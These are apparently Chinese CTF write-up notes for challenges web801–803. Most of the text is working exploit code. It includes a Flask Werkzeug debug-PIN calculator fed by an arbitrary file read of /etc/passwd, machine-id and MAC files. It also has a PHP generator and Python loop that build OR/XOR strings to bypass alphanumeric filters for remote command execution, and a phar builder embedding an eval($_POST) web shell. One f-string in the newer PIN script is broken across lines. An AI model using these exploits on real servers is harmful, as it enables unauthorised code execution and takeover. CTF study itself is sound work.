### web801
flask pin码计算
python3.6和python3.8计算方式不一样

#### 条件: flask debug模式开启 存在任意文件读取

```
probably_public_bits包含4个字段，分别为
username
modname
getattr(app, 'name', app.class.name)
getattr(mod, 'file', None)

其中username对应的值为当前主机的用户名
	linux可以查看/etc/passwd
	windows可以查看C:/Users目录
modname的值为'flask.app'
getattr(app, 'name', app.class.name)对应的值为'Flask'
getattr(mod, 'file', None)对应的值为app包的绝对路径

private_bits包含两个字段，分别为
str(uuid.getnode())
get_machine_id()

其中str(uuid.getnode())为网卡mac地址的十进制值
	在inux系统下得到存储位置为/sys/class/net/（对应网卡）/address 一般为eth0
	windows中cmd执行config /all查看
get_machine_id()的值为当前机器唯一的机器码
	对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_id
	docker机则读取/proc/self/cgroup。
	windows的id在注册表中 （HKEY_LOCAL_MACHINE->SOFTWARE->Microsoft->Cryptography）
```
旧版:
```python
import hashlib
import getpass
from flask import Flask
from itertools import chain
import sys
import uuid
username=getpass.getuser() 
app = Flask(__name__)
modname=getattr(app, "__module__", app.__class__.__module__)
mod = sys.modules.get(modname)

probably_public_bits = [
    username, #用户名 一般为root或者读下/etc/passwd
    modname,  #一般固定为flask.app
    getattr(app, "__name__", app.__class__.__name__), #固定，一般为Flask
    getattr(mod, "__file__", None),    #flask库下app.py的绝对路径，可以通过报错信息得到
]
mac ='02:42:ac:0c:ac:28'.replace(':','')
mac=str(int(mac,base=16))
private_bits = [
	mac,
	 "机器码"
	 ]
h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = "__wzd" + h.hexdigest()[:20]

# If we need to generate a pin we salt it a bit more so that we don't
# end up with the same value and generate out 9 digits
num=None
if num is None:
    h.update(b"pinsalt")
    num = ("%09d" % int(h.hexdigest(), 16))[:9]

# Format the pincode in groups of digits for easier remembering if
# we don't have a result yet.
rv=None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num
    print(rv)
```
新版:
```python
import hashlib
import getpass
from flask import Flask
from itertools import chain
import sys
import uuid
import typing as t
username='root'
app = Flask(__name__)
modname=getattr(app, "__module__", t.cast(object, app).__class__.__module__)
mod=sys.modules.get(modname)
mod = getattr(mod, "__file__", None)

probably_public_bits = [
    username, #用户名
    modname,  #一般固定为flask.app
    getattr(app, "__name__", app.__class__.__name__), #固定，一般为Flask
    '/usr/local/lib/python3.8/site-packages/flask/app.py',   #主程序（app.py）运行的绝对路径
]
print(probably_public_bits)
mac ='02:42:ac:0c:ac:28'.replace(':','')
mac=str(int(mac,base=16))
private_bits = [
   mac,#mac地址十进制
 "机器码"
     ]
print(private_bits)
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{
      
      h.hexdigest()[:20]}"

# If we need to generate a pin we salt it a bit more so that we don't
# end up with the same value and generate out 9 digits
h.update(b"pinsalt")
num = f"{
      
      int(h.hexdigest(), 16):09d}"[:9]

# Format the pincode in groups of digits for easier remembering if
# we don't have a result yet.
rv=None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print(rv)
```

web802 无字母数字RCE
https://blog.csdn.net/Sapphire037/article/details/121054836

生成异或字符:
```php
<?php
/*
# -*- coding: utf-8 -*-
# @Author: Y4tacker
# @Date:   2020-11-21 20:31:22
*/
//或
function orRce($par1, $par2){
    $result = (urldecode($par1)|urldecode($par2));
    return $result;
}

//异或
function xorRce($par1, $par2){
    $result = (urldecode($par1)^urldecode($par2));
    return $result;
}

//取反
function negateRce(){
    fwrite(STDOUT,'[+]your function: ');

    $system=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN));

    fwrite(STDOUT,'[+]your command: ');

    $command=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN));

    echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';
}

//mode=1代表或，2代表异或，3代表取反
//取反的话，就没必要生成字符去跑了，因为本来就是不可见字符，直接绕过正则表达式
function generate($mode, $preg='/[0-9]/i'){
    if ($mode!=3){
        $myfile = fopen("rce.txt", "w");
        $contents = "";

        for ($i=0;$i<256;$i++){
            for ($j=0;$j<256;$j++){
                if ($i<16){
                    $hex_i = '0'.dechex($i);
                }else{
                    $hex_i = dechex($i);
                }
                if ($j<16){
                    $hex_j = '0'.dechex($j);
                }else{
                    $hex_j = dechex($j);
                }
                if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
                    echo "";
                }else{
                    $par1 = "%".$hex_i;
                    $par2 = '%'.$hex_j;
                    $res = '';
                    if ($mode==1){
                        $res = orRce($par1, $par2);
                    }else if ($mode==2){
                        $res = xorRce($par1, $par2);
                    }

                    if (ord($res)>=32&ord($res)<=126){
                        $contents=$contents.$res." ".$par1." ".$par2."\n";
                    }
                }
            }

        }
        fwrite($myfile,$contents);
        fclose($myfile);
    }else{
        negateRce();
    }
}
generate(1,'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i');
//1代表模式，后面的是过滤规则
```php
# -*- coding: utf-8 -*-
import requests
import urllib
from sys import *
import os

os.system("php D:\\phpstudy_pro\\WWW\\rce_fuzz.php")  # 没有将php写入环境变量需手动运行
if (len(argv) != 2):
	print("=" * 50)
	print('USER：python exp.py <url>')
	print("eg：  python exp.py http://ctf.show/")
	print("=" * 50)
	exit(0)
url = argv[1]


def action(arg):
	s1 = ""
	s2 = ""
	for i in arg:
		f = open(r"D:\phpstudy_pro\WWW\rce.txt", "r")//填txt的文件位置
		while True:
			t = f.readline()
			if t == "":
				break
			if t[0] == i:
				# print(i)
				s1 += t[2:5]
				s2 += t[6:9]
				break
		f.close()
	output = "(\"" + s1 + "\"|\"" + s2 + "\")"
	return (output)


while True:
	param = action(input("\n[+] your function：")) + action(input("[+] your command："))
	data = {
		'c': urllib.parse.unquote(param)
	}
	r = requests.post(url, data=data)
	print("\n[*] result:\n" + r.text)
```

### web803
没有权限写目录，可以写tmp目录

phar文件包含
源码:
```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$file = $_POST['file'];
$content = $_POST['content'];

if(isset($content) && !preg_match('/php|data|ftp/i',$file)){
    if(file_exists($file.'.txt')){
        include $file.'.txt';
    }else{
        file_put_contents($file,$content);
    }
}
```
<a href="https://blog.csdn.net/xxy605/article/details/120101090">phar文件生成</a>
```php
<?php 
$phar = new Phar("shell.phar");
$phar->startBuffering();
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
$phar->addFromString("a.txt", "<?php eval(\$_POST[1]);?>");
$phar->stopBuffering();
?>
```